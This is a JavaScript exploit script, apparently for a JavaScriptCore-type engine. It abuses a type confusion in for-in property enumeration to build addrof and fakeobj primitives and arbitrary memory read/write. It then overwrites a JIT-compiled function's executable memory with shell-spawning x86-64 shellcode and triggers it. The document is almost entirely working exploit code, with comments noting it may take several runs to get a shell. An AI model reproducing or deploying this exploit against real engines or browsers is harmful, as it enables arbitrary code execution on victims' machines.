// The exploit code is not stable. Maybe you have to run this code several time to get a shell.

///////////////////////POC/////////////////////////

function gc() {
    for (let i = 0; i < 10; i++) {
        let ab = new ArrayBuffer(1024 * 1024 * 10);
    }
}

var buf = new ArrayBuffer(8);
var double_arr = new Float64Array(buf);
var int32_arr = new Uint32Array(buf);

function opt(obj) {
    // Starting the optimization.
    for (let i = 0; i < 500; i++) {

    }

    let tmp = {a: 1};

    gc();
    tmp.__proto__ = {};

    for (let k in tmp) {  // The structure ID of "tmp" is stored in a JSPropertyNameEnumerator.
        tmp.__proto__ = {};

        gc();

        obj.__proto__ = {};  // The structure ID of "obj" equals to tmp's.

        return obj[k];  // Type confusion.
    }
}

opt({});

let fake_object_memory = new Uint32Array(100);
fake_object_memory[0] = 0x4c;
fake_object_memory[1] = 0x1001600;

let fake_object = opt(fake_object_memory);

for (i = 0; i < 0x1000; i ++) {
    fake_object.a = {test : 1};
    fake_object.b = {test : 1};
}

/////////////////////// addrof, fakeobj //////////////////////

function addrof(obj) {
	fake_object.a = obj;
	int32_arr[0] = fake_object_memory[4];
	int32_arr[1] = fake_object_memory[5];
	return double_arr[0];
}

function fakeobj(addr) {
	double_arr[0] = addr;
	fake_object_memory[4] = int32_arr[0];
	fake_object_memory[5] = int32_arr[1];
	
	return fake_object.a;
}

///////////////////////////// exploit /////////////////////////////

function Add(a, b) {
        double_arr[0] = a;
        int32_arr[0] += b;
	
	return double_arr[0];
}

var container_addr = Add(addrof(fake_object), 0x40);
fake_object_memory[16] = 0x1000;
fake_object_memory[17] = 0x01082107;


var struct = [];
for (i = 0; i < 0x1000; i++) {
	arr = [13.37];
	arr.pointer = 13.37;
	arr["prop"+i] = 13.37;
	struct.push(arr);
}


var victim = struct[0x800];
double_arr[0] = addrof(victim);
fake_object_memory[18] = int32_arr[0];
fake_object_memory[19] = int32_arr[1];

double_arr[0] = container_addr;
fake_object_memory[6] = int32_arr[0];
fake_object_memory[7] = int32_arr[1];
var hax = fake_object.b;

var original_butterfly = hax[1];

/* Just ignore it. I didn't use this function. */
function write64(addr, value) {
	double_arr[0] = addr;
	int32_arr[0] += 0x10;
	hax[1] = double_arr[0];
	
	victim.pointer = value;
}

function read64(addr) {
	double_arr[0] = addr;
	int32_arr[0] += 0x10;
	hax[1] = double_arr[0];
	
	return addrof(victim.pointer);
}


var shellcode_buf = new ArrayBuffer(82);
var uint8_shellcode = new Uint8Array(shellcode_buf);
var uint16_shellcode = new Uint16Array(shellcode_buf);

var shellcode = [0x31, 0xc0, 0x48, 0xbb, 0xd1, 0x9d, 0x96, 0x91, 0xd0, 0x8c, 0x97, 0xff, 0x48, 0xf7, 0xdb, 0x53, 0x54, 0x5f, 0x99, 0x52, 0x57, 0x54, 0x5e, 0xb0, 0x3b, 0x0f, 0x05];

for (i = 0; i < 82; i++) {
	uint8_shellcode[i] = shellcode[i];
}

/*
 * Make func and trigger the JIT compile.
 * We can make rwx memory region.
 * This region will be overwritten by shellcode.
 */
function func() {
	arr = [];
	for (i = 0; i < 0x1000; i++) {
		a = {};
		a["prop"+i] = 10;
		arr.push(a);
	}
	print("I'm func");
}

func();

var funcAddr = addrof(func);
print(describe(func));
print(funcAddr);

var executableAddr = read64(Add(funcAddr, 24));
var jitCodeObjAddr = read64(Add(executableAddr, 24));
var jitCodeAddr2 = read64(Add(jitCodeObjAddr, 24));
var jitCodeAddr = read64(Add(jitCodeAddr2, 40));

/*
 * Copy the shellcode into rwx region.
 * each time, 2 bytes of shellcode are copied.
 */
for (i = 0; i < 41; i++) {
	hax[1] = Add(jitCodeAddr, 0x10 + 2*i);
	victim.pointer = uint16_shellcode[i];
}

/* trigger the shellcode */
func();
